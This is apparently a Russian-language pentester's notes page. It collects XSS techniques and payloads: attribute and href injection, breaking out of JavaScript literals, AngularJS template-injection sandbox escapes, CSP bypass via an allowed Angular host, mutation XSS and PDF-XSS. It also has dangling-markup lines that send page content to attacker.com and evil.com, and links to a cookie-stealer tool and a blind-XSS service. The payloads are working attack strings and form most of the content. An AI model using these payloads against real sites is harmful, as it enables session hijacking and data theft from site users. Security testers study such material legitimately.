***
# Репозитории с XSS payloads

[Tiny XSS Payloads](https://tinyxss.terjanq.me/)
[PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cross-site-scripting)
[kensworth/cookie-stealer](https://github.com/kensworth/cookie-stealer)

***
# Навигация

> [[XSS#XSS в HTML атрибутах|1. XSS в HTML атрибутах]]
> [[XSS### XSS into JavaScript|2. XSS into JavaScript]]
> [[XSS#CSTI - Client side template injection|3. CSTI - Client side template injection]]
> [[XSS#Dangling Markup|4. Dangling Markup]]
> [[XSS#**CSP**|5. CSP]]
> [[XSS#Self-XSS|6. Self-XSS ]]
> [[XSS#PDF-XSS|7. PDF-XSS]]
> [[XSS#Mutation XSS|8. Mutation XSS]]
> [[XSS#Bliend XSS|9. Bliend XSS]]
***

## Формы отправки запросов JS

``` html
<script>
	fetch('https://site.com/', {method: "GET"}) // обычный GET запрос
</script>
```
``` html
<script>
	const req = new XMLHttpRequest()
	req.open("GET", "https://site.com/")
	req.send() // обычный GET запрос
</script>
```

---

# XSS в HTML атрибутах

[portswigger.net/XSS/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
1. Через intruder проверить не заблокированные теги и атрибуты.
2. Если ввод попадает в href, можно использовать следующую конструкцию `javascript:alert(1)`. Выйдет следующее: 
`<a href="javascript:alert(document.domain)">`
3. Проверь атрибут `accesskey`. Пример: 
`https://web-site/?%27accesskey=%27x%27onclick=%27alert(1)`; где `%27` = `'`. 
Скрипт сработает при нажатии:
- On Windows: `ALT+SHIFT+X` / `ALT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`

Пример нагрузки с кастомным тегом:
``` html
<qwe id=x onfocus=alert(document.cookie) tabindex=1>#x
```
> 1. Этот тег при загрузке фокусируется сам на себе и вызывает `alert`.

Пример svg с заменой ссылки через `<animate>`:
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
> 1. SVG — стандартный формат, поэтому браузеры доверяют содержимому и не блокируют разметку.
> 2. Атрибут `href` поддерживает схемы `URI`; `javascript:` заставляет браузер выполнить встроенный код вместо перехода по ссылке.
> 3. Псевдо-анимация `<animate>` меняет `href` на `javascript:-URI`, и достаточно клика по ссылке, чтобы выполнить `alert(1)`.

или с `<animatetransform>`:
```html
<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
```

---
# XSS into JavaScript
Если ввод попадает в скрипт внутри HTML:
1. Попытаться закрыть тег предыдущего скрипта и открыть новый: `</script><img src=1 onerror=alert(document.domain)>`
2. Если ввод находится в литералах : \` \`, ' ', " ", стоит попытаться выйти из них:
	```javascript
	'-alert(document.domain)-'
	';alert(document.domain)//
	```
	
	2.1. Если литералы экранируются, стоит проверить экранацию косой черты: \\ : ``\';alert(document.domain)//``
	2.2. Если косая черта экранируется, можно закодировать литерал, скорее всего в HTML кодировку: 
	`&apos;-alert(document.domain)-&apos;`
	2.3. Использовать конструкцию \${}: `${alert(document.domain)}`
1. Если запрещены круглые скобки, можно передавать аргументы в функции через конструкцию: `onerror=alert;throw 1`

# CSTI - Client side template injection
[XSS in Angular.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
**CSTI** - тип уязвимости, возникающий, когда разработчик позволяет пользовательскому вводу определять выражения шаблонов на веб-странице, что позволяет злоумышленнику внедрять вредоносные выражения шаблонов (которые являются упрощённым JavaScript) для эксплуатации веб-приложения. Это происходит в браузере и HTML, аналогично тому, как работает межсайтовый скриптинг (XSS). Некоторые JS фреймворки, такие как AngularJS, имеют песочницу, которая предотвращает использование определённых объектов, к которым разработчик не имел права доступа. Чтобы злоумышленник мог эксплуатировать это, ему нужно найти способ "выбраться" из песочницы, что означает получение доступа к областям, таким как объект документа, чтобы проэксплуатировать веб-приложение.

>Также иногда с помощью CSTI могут обходить CSP, допустим он разрешает погружать скрипты только с [some.com](http://some.com/), вы идёте туда, находите там Angular.js файл, а дальше подключаете его к странице, внедряете директиву ng-app и вставляете пэйлоад:

`<script src='<https://some.com/angular.min.js>'></script><div ng-app>{{$on.constructor.constructor('alert(document.domain)')()}}`

Для эксплуатации CSTI в Angular без песочницы используют следующую полезную нагрузку:

`{{$on.constructor('alert(1)')()}}`
# Dangling Markup
Кража данных посредством эксплуатации пэйлоада с открывающейся `'`, но не закрывая её:
[Dangling Markup - HTML scriptless injection | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
```html 
<img src='http://attacker.com/log.php?HTML=
```
```html
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
```
```html
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
# **CSP**
[Content Security Policy (CSP) Bypass | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

<div style="margin:5px; padding:5px; background-color: #E56D3D"><b>CSP (Content Security Policy)</b> - позволяет определять белые списки источников для подключения JavaScript, стилей, изображений, фреймов, создания соединений. </div>

<div style="margin:5px; padding:5px; background-color: #E56D3D">Также CSP может регулировать возможность исполнения inline-скриптов, возможность подключения текущей страницы во фрейме и т. д.</div>

CSP — это механизм безопасности браузера, целью которого является смягчение XSS и некоторых других атак. Он работает путем ограничения ресурсов (таких как скрипты и изображения), которые может загружать страница, и ограничения возможности включения страницы в рамки других страниц. 

Чтобы включить CSP, ответ должен включать заголовок `Content-Security-Policy` со значением, содержащим политику. Сама политика состоит из одной или нескольких директив, разделенных точкой с запятой.
## CSP директивы 

[CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/) - сервис для проверки на безопасность веб-страницы по её CSP тегам. 
![[CSP директивы.png]]

# Self-XSS
**Self-XSS** - это форма атаки, при которой жертва атаки ненамеренно запускает вредоносный код в своём собственном браузере, что приводит к раскрытию личной информации атакующему. Это достигается путём **обмана пользователей в копировании и вставке вредоносного контента в консоль веб-разработчика** их браузера. В обычных условиях атакующий публикует сообщение, утверждая, что копирование и выполнение определённого кода позволит пользователю получить виртуальные награды или взломанный сайт. На самом деле код позволяет атакующему захватить учётную запись жертвы. 

# PDF-XSS
Если браузер использует PDF, можно исполнить JS следующим образом:
```url
https://sute/file.pdf#any=javascript:alert(1)
```
# Mutation XSS
**Mutation XSS (mxss)** - тип атаки на веб-приложение, который происходит, когда ненадёжные данные обрабатываются в контексте свойства DOM 'innerHTML' и изменяются браузером. Этот  тип атаки особенно опасен, поскольку он может обойти большинство существующих фильтров и санитайзеров XSS, позволяя вредоносному коду выполняться в браузере пользователя. Примером может служить ситуация, когда сервер корректно экранирует входные данные, но не предотвращает их декодирование браузером в вредоносный скрипт из-за сложного поведения браузера, который переинтерпретирует контент. 
Другими словами браузер может самостоятельно не только декодировать символы, но и дописывать HTML теги. Т.е если подать на вход:
```javascript
<template><p title="</template><img src=x onerror=alert(1)>">
```
То браузер может переписать это в:
```javascript
<template>
	<p title="</template><img src=x onerror=alert(1)>"></p>
</template>
```
# Bliend XSS
**Bliend XSS** - тип уязвимости, при котором вредоносный код внедряется в веб-приложение и сохраняется на сервере, но его выполнение происходит в другом месте, недоступном для атакующего. 
Можно поднять у себя следующую службу: [XSS Hanter Express](https://github.com/mandatoryprogrammer/xsshunter-express), они служит отличный инструментом для эксплуатации **bliend XSS**.

---

### Прочие Payload-ы

``` html
<div style=background-image: url(javascript:alert(XSS))>
```